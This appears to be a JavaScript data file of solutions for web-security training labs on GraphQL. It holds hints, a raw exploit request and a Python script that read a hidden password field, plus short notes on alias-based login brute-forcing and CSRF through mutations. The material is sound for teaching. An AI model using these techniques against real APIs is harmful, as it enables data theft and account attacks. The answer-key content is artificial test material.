export default {
  'graphql-lab-graphql-reading-private-posts': {
    note: 'Introspection reveals a `postPassword` field; query the private post by id and read the password.',
    work: {
      hints: [
        'Send an introspection query to `/graphql`. Look for fields on the `BlogPost` type that the UI never displays.',
        '`getBlogPost(id: Int)` returns the post. The `postPassword` field is present but not requested by the front end.',
        'Query `getBlogPost(id: 3) { id title postPassword }` and submit the password.'
      ],
      approach:
        'Introspection exposes a field that the UI does not use, and the resolver returns it without a field-level authorisation check. The schema itself is the map; the missing check is the vulnerability.',
      request: `POST /graphql HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/json
Cookie: session=YOUR-SESSION

{"query":"query { getBlogPost(id: 3) { id title postPassword } }"}`,
      tokens: [
        ['POST /graphql', 'A single endpoint that dispatches every operation.'],
        ['getBlogPost(id: 3)', 'A query field with an argument selecting the private post.'],
        ['postPassword', 'A field revealed by introspection; the front end never requests it.'],
        ['(resolver)', 'Returns the stored password without checking whether the caller may see it.'],
        ['session cookie', 'Authenticates the request, but field-level authorisation is absent.']
      ],
      script: `import sys, requests

host = sys.argv[1]
r = requests.post(f"https://{host}/graphql", json={
    "query": "query { getBlogPost(id: 3) { id title postPassword } }"
}, timeout=20)
print(r.status_code, r.text[:500])`
    }
  },
  'graphql-lab-graphql-accidental-field-exposure': {
    note: 'Introspection or field suggestions reveal an `isAdmin`/`email` field that the UI never requests.'
  },
  'graphql-lab-graphql-find-the-endpoint': {
    note: 'The endpoint is hidden; use directory/endpoint discovery, then introspection to enumerate mutations.'
  },
  'graphql-lab-graphql-brute-force-protection-bypass': {
    note: 'Alias many login attempts in one query; the HTTP rate limiter sees a single request.'
  },
  'graphql-lab-graphql-csrf-via-graphql-api': {
    note: 'The endpoint accepts form-encoded POSTs without a CSRF token; submit a mutation from an auto-submitting form.'
  }
}
